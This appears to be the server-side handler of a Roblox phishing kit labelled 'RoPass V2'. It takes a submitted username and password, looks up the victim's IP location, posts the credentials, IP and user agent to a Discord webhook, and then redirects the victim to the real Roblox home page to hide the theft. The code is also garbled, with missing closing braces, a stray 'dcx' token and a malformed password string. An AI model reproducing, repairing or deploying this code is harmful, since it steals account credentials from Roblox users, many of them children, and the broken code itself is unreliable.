export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({
            error: "Method not allowed"
        });
    }

    try {
        const { username } = req.body;
        const { password } = req.body;

        if (!username) {
            return res.status(400).json({
                error: "Username required"
            });
        if (!password) {
            return res.status(400).json({
                error: "Password required"
        }

        const ip =
            req.headers["x-forwarded-for"] ||
            req.socket.remoteAddress ||
            "Unknown";

        const userAgent = req.headers["user-agent"] || "Unknown";

        // GEOLOCATION
        let geo = {};

        try {
            const geoReq = await fetch(`https://ipapi.co/${ip}/json/`);
            geo = await geoReq.json();
        } catch (e) {
            geo = {};
        }

        // DISCORD WEBHOOK
        const webhook = process.env.DISCORD_WEBHOOK;

        const payload = {
            embeds: [
                {
                    title: "RoPass V2",
                    color: 0x3762dc,
                    fields: [
                        {
                            name: "👤 Username",
                            value: `\`${username}\``,
                            inline: true
                        },
                        dcx 
                        {
                            name: "🌍 IP",
                            value: `\`${ip}\``,
                            inline: true
                        },
                        {
                            name: "📍 Country",
                            value: `\`${geo.country_name || "Unknown"}\``,
                            inline: true
                        },
                        {
                            name: "🔐 Password",
                            value: `\`${password} || "Unknown"}\``,
                            inline: true
                        },
                        {
                            name: "🖥️ User Agent",
                            value: `\`${userAgent}\``,
                            inline: false
                        }
                    ],
                    timestamp: new Date().toISOString()
                }
            ]
        };

        await fetch(webhook, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        return res.status(200).json({
            success: true,
            redirect: "https://www.roblox.com/home"
        });

    } catch (err) {
        console.error(err);

        return res.status(500).json({
            error: "Internal server error"
        });
    }
}
